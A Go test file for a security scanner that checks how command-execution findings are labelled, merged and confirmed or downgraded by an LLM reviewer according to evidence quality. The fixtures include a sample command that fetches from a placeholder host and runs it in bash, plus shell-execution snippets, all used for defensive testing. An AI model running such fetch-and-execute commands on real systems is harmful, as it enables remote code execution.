package handler

import (
	"strings"
	"testing"

	"skill-scanner/internal/llm"
	"skill-scanner/internal/plugins"
	"skill-scanner/internal/review"
)

func TestStructuredFindingSourceLabelsRequireActualSandboxEvidence(t *testing.T) {
	staticOnly := structuredFindingSourceLabels(review.StructuredFinding{
		ID:               "SF-001",
		Title:            "命令执行",
		Source:           "Static",
		CalibrationBasis: []string{"存在高危时序告警，可支持攻击路径成立性复核"},
		Evidence:         []string{"scripts/run.py:10 | os.system(cmd)"},
	}, "", 0)
	if containsString(staticOnly, "沙箱动态") {
		t.Fatalf("expected static finding with sequence basis not labeled as sandbox dynamic, got %+v", staticOnly)
	}

	withSandboxEvidence := structuredFindingSourceLabels(review.StructuredFinding{
		ID:               "SF-002",
		Title:            "命令执行",
		Source:           "BehaviorGuard",
		CalibrationBasis: []string{"沙箱已记录高危时序，可支持攻击路径成立性复核"},
		Evidence:         []string{"[sandbox] scripts/run.py:10 | exec.Command('/bin/sh')"},
	}, "", 0)
	if !containsString(withSandboxEvidence, "沙箱动态") {
		t.Fatalf("expected finding with sandbox evidence labeled as sandbox dynamic, got %+v", withSandboxEvidence)
	}
}

func TestBuildStructuredFindingsMergesSourceLabelsAcrossLLMAndStatic(t *testing.T) {
	findings := []plugins.Finding{
		{PluginName: "LLM", RuleID: "SF-004", Severity: "中风险", Title: "LLM检测: 命中黑名单目标（域名/IP）", Description: "命中策略", Location: "README.md:5"},
		{PluginName: "Static", RuleID: "SF-011", Severity: "中风险", Title: "命中黑名单目标（域名/IP）", Description: "命中策略", Location: "docs/guide.md:9"},
	}

	structured := buildStructuredFindings(findings, review.Result{}, nil, "", nil)
	if len(structured) != 1 {
		t.Fatalf("expected one merged finding, got %+v", structured)
	}
	if structured[0].Source != "LLM+Static" {
		t.Fatalf("expected merged source labels LLM+Static, got %+v", structured[0])
	}
	labels := structuredFindingSourceLabels(structured[0], "", 0)
	if !containsString(labels, "LLM静态") || !containsString(labels, "规则静态") {
		t.Fatalf("expected source badges include LLM/static after merge, got %+v", labels)
	}
}

func TestLLMReviewVerdictRequiresEvidenceBoundFixForConfirmedRisk(t *testing.T) {
	verdict := llmAnalysisToReviewVerdict(review.ReviewAgentTask{FindingID: "SF-001", StrictStandards: []string{"证据完整性"}, StageContext: &review.LLMStageContext{Finding: review.NormalizedFinding{CodeEvidenceRefs: []string{"scripts/run.py:10 os.system(cmd)"}, EvidenceRefs: []string{"scripts/run.py:10 os.system(cmd)"}}}}, &llm.AnalysisResult{
		IntentRiskLevel: "high",
		Risks: []llm.RiskItem{{
			Title:              "命令执行",
			Severity:           "high",
			Status:             "confirmed",
			Description:        "用户输入进入 shell 执行",
			Evidence:           "os.system(cmd)",
			KeyCodeLocation:    "scripts/run.py:10",
			EvidenceRefs:       []string{"scripts/run.py:10 os.system(cmd)"},
			Remediation:        "在 scripts/run.py:10 移除 shell 拼接，改为固定命令 allowlist 和参数数组传递，拒绝声明范围外的命令。",
			VerificationStep:   "重新扫描 scripts/run.py:10，确认 os.system(cmd) 证据消失且命令执行 finding 不再 confirmed。",
			RemediationQuality: "high",
		}},
	})
	if verdict.Verdict != "confirmed" {
		t.Fatalf("expected confirmed when evidence-bound fix passes quality gate, got %+v", verdict)
	}
	for _, want := range []string{"关键代码: scripts/run.py:10", "证据: scripts/run.py:10 os.system(cmd)", "修复:", "验证:"} {
		if !strings.Contains(verdict.Fix, want) {
			t.Fatalf("expected evidence-bound fix to contain %q, got %q", want, verdict.Fix)
		}
	}
}

func TestLLMAnalysisVerdictDowngradesConfirmedWithoutTypedEvidenceMatch(t *testing.T) {
	verdict := llmAnalysisToReviewVerdict(review.ReviewAgentTask{FindingID: "SF-CTX", StrictStandards: []string{"证据完整性"}, StageContext: &review.LLMStageContext{Finding: review.NormalizedFinding{ContextEvidenceRefs: []string{"README.md:12 示例说明"}, EvidenceRefs: []string{"README.md:12 示例说明"}}}}, &llm.AnalysisResult{
		IntentRiskLevel: "high",
		Risks: []llm.RiskItem{{
			Title:              "命令执行",
			Severity:           "high",
			Status:             "confirmed",
			Description:        "文档描述支持命令执行",
			Evidence:           "README text",
			KeyCodeLocation:    "README.md:12",
			EvidenceRefs:       []string{"README.md:12 示例说明"},
			Remediation:        "删除危险说明。",
			VerificationStep:   "重新扫描 README.md。",
			RemediationQuality: "high",
		}},
	})
	if verdict.Verdict != "needs_manual_review" || verdict.Confidence != "低" {
		t.Fatalf("expected AnalyzeCode confirmed without typed evidence to downgrade, got %+v", verdict)
	}
	if !containsString(verdict.MissingEvidence, "二审上下文缺少可用于 confirmed 的代码或行为证据") {
		t.Fatalf("expected typed evidence gate missing evidence, got %+v", verdict.MissingEvidence)
	}
	if !strings.Contains(verdict.Reason, "硬校验") {
		t.Fatalf("expected hard validation downgrade reason, got %+v", verdict)
	}
}

func TestLLMAnalysisVerdictKeepsConfirmedWhenTypedEvidenceMatches(t *testing.T) {
	verdict := llmAnalysisToReviewVerdict(review.ReviewAgentTask{FindingID: "SF-MATCH", StrictStandards: []string{"证据完整性"}, StageContext: &review.LLMStageContext{Finding: review.NormalizedFinding{CodeEvidenceRefs: []string{"scripts/run.py:10 os.system(cmd)"}, BehaviorEvidenceRefs: []string{"关键样本: curl http://bad && bash"}, EvidenceRefs: []string{"scripts/run.py:10 os.system(cmd)", "关键样本: curl http://bad && bash"}}}}, &llm.AnalysisResult{
		IntentRiskLevel: "high",
		Risks: []llm.RiskItem{{
			Title:              "命令执行",
			Severity:           "high",
			Status:             "confirmed",
			Description:        "命令拼接进入 shell",
			Evidence:           "os.system(cmd)",
			KeyCodeLocation:    "scripts/run.py:10",
			EvidenceRefs:       []string{"scripts/run.py:10 os.system(cmd)"},
			Remediation:        "在 scripts/run.py:10 移除 shell 拼接，改为固定命令 allowlist 和参数数组传递。",
			VerificationStep:   "重新扫描 scripts/run.py:10，确认 os.system(cmd) 证据消失。",
			RemediationQuality: "high",
		}},
	})
	if verdict.Verdict != "confirmed" {
		t.Fatalf("expected AnalyzeCode confirmed with typed evidence match, got %+v", verdict)
	}
}

func TestLLMAnalysisVerdictKeepsConfirmedWhenAliasMatchesPrimaryLocation(t *testing.T) {
	verdict := llmAnalysisToReviewVerdict(review.ReviewAgentTask{FindingID: "SF-ALIAS", StrictStandards: []string{"证据完整性"}, StageContext: &review.LLMStageContext{Finding: review.NormalizedFinding{CodeEvidenceRefs: []string{"scripts/run.py:10 os.system(cmd)"}, EvidenceAliases: []string{"scripts/run.py:10", "scripts/run.py:10 os.system(cmd)"}, PrimaryLocation: "scripts/run.py:10", EvidenceRefs: []string{"scripts/run.py:10 os.system(cmd)"}}}}, &llm.AnalysisResult{
		IntentRiskLevel: "high",
		Risks: []llm.RiskItem{{
			Title:              "命令执行",
			Severity:           "high",
			Status:             "confirmed",
			Description:        "命令拼接进入 shell",
			Evidence:           "os.system(cmd)",
			KeyCodeLocation:    "scripts/run.py:10",
			EvidenceRefs:       []string{"scripts/run.py:10"},
			Remediation:        "在 scripts/run.py:10 移除 shell 拼接，改为固定命令 allowlist 和参数数组传递。",
			VerificationStep:   "重新扫描 scripts/run.py:10，确认 os.system(cmd) 证据消失。",
			RemediationQuality: "high",
		}},
	})
	if verdict.Verdict != "confirmed" {
		t.Fatalf("expected confirmed when alias matches primary location, got %+v", verdict)
	}
}

func TestLLMReviewVerdictDowngradesGenericFix(t *testing.T) {
	verdict := llmAnalysisToReviewVerdict(review.ReviewAgentTask{FindingID: "SF-001", StrictStandards: []string{"修复质量"}}, &llm.AnalysisResult{
		IntentRiskLevel: "high",
		Risks: []llm.RiskItem{{
			Title:              "命令执行",
			Severity:           "high",
			Status:             "confirmed",
			Description:        "用户输入进入 shell 执行",
			Evidence:           "os.system(cmd)",
			Remediation:        "加强安全并遵循最佳实践。",
			RemediationQuality: "low",
		}},
	})
	if verdict.Verdict != "needs_manual_review" || verdict.Confidence != "低" {
		t.Fatalf("expected generic fix to be downgraded to manual review, got %+v", verdict)
	}
	if !containsString(verdict.MissingEvidence, "LLM reviewer 修复建议质量门禁未通过") {
		t.Fatalf("expected quality gate missing evidence, got %+v", verdict.MissingEvidence)
	}
}

func TestBuildStructuredFindingsPopulatesTypedEvidenceRefs(t *testing.T) {
	findings := []plugins.Finding{
		{PluginName: "Static", RuleID: "V7-009", Severity: "高风险", Title: "命令执行", Description: "命令拼接进入 shell", Location: "scripts/run.py:10", CodeSnippet: "os.system(cmd)"},
		{PluginName: "LLM", RuleID: "V7-009", Severity: "高风险", Title: "命令执行", Description: "文档描述支持远程执行", Location: "README.md:12", CodeSnippet: "tool supports remote execution"},
	}

	structured := buildStructuredFindings(findings, review.Result{}, nil, "", nil)
	if len(structured) != 1 {
		t.Fatalf("expected merged structured finding, got %+v", structured)
	}
	item := structured[0]
	if !containsString(item.CodeEvidenceRefs, "scripts/run.py:10") {
		t.Fatalf("expected code evidence refs populated, got %+v", item)
	}
	if !containsString(item.ContextEvidenceRefs, "README.md:12") {
		t.Fatalf("expected context evidence refs populated, got %+v", item)
	}
	stage := buildSecondReviewStageContext(item, review.RuleExplanation{}, review.FalsePositiveReview{}, "", nil, nil)
	if !containsString(stage.Finding.CodeEvidenceRefs, "scripts/run.py:10") || !containsString(stage.Finding.ContextEvidenceRefs, "README.md:12") {
		t.Fatalf("expected stage context reuses typed evidence refs from structured finding, got %+v", stage.Finding)
	}
}
